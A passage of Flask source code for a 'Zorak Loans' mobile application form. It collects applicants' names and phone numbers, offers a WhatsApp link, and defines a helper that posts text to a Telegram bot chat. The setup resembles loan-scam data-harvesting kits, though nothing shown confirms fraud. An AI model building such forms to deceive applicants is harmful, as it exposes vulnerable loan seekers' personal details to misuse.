from flask import Flask, request, render_template_string
import csv, os, requests
from datetime import datetime

app = Flask(__name__)

WHATSAPP_LINK = "https://wa.me/message/CFCJWLOZ7IWZK1"
BOT_TOKEN = os.environ.get("BOT_TOKEN")
CHAT_ID = os.environ.get("CHAT_ID")

def send_to_telegram(text):
    if not BOT_TOKEN or not CHAT_ID:
        print("Telegram not configured")
        return
    try:
        requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            json={"chat_id": CHAT_ID, "text": text},
            timeout=10
        )
    except Exception as e:
        print("Telegram error:", e)

FORM_HTML = f"""
<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
* {{ box-sizing: border-box; font-family: Arial, sans-serif; }}
body {{ margin: 0; background: #f0f2f5; padding: 15px; }}
.card {{ max-width: 420px; margin: 0 auto; background: white; border-radius: 18px; overflow: hidden; box-shadow: 0 4px 20px rgba(0,0,0,0.1); }}
.header {{ background: linear-gradient(135deg, #0f7a55, #12b981); color: white; padding: 25px 20px; text-align: center; }}
.header h1 {{ margin: 0; font-size: 24px; }}
.header p {{ margin: 8px 0 0; font-size: 14px; opacity: 0.9; }}
.form {{ padding: 20px; }}
label {{ font-size: 13px; font-weight: bold; color: #333; display: block; margin-bottom: 6px; margin-top: 15px; }}
input, select {{ width: 100%; padding: 13px; border: 1px solid #ddd; border-radius: 10px; font-size: 15px; outline: none; background: #fafafa; }}
input:focus, select:focus {{ border-color: #12b981; background: white; }}
.check {{ display: flex; gap: 8px; align-items: flex-start; font-size: 13px; color: #555; margin-top: 18px; }}
.check input {{ width: auto; margin-top: 2px; }}
.btn {{ width: 100%; background: #0f7a55; color: white; border: none; padding: 15px; border-radius: 12px; font-size: 16px; font-weight: bold; margin-top: 20px; cursor: pointer; }}
.btn:active {{ background: #0a5c40; }}
.wa {{ display: block; text-align: center; background: #25D366; color: white; text-decoration: none; padding: 13px; border-radius: 12px; font-weight: bold; margin-top: 12px; font-size: 15px; }}
.safe {{ text-align: center; font-size: 12px; color: #888; margin-top: 15px; }}
</style>
</head>
<body>
<div class="card">
  <div class="header">
    <h1>Zorak Loans</h1>
    <p>Fast, Easy & Trusted Loan Application</p>
  </div>
  <div class="form">
    <form method="POST" action="/apply">
      <label>Full Name</label>
      <input name="name" placeholder="e.g. Elkana Ngetich" required>

      <label>Phone Number</label>
      <input name="phone" placeholder="+254 / +260 / +263 / +
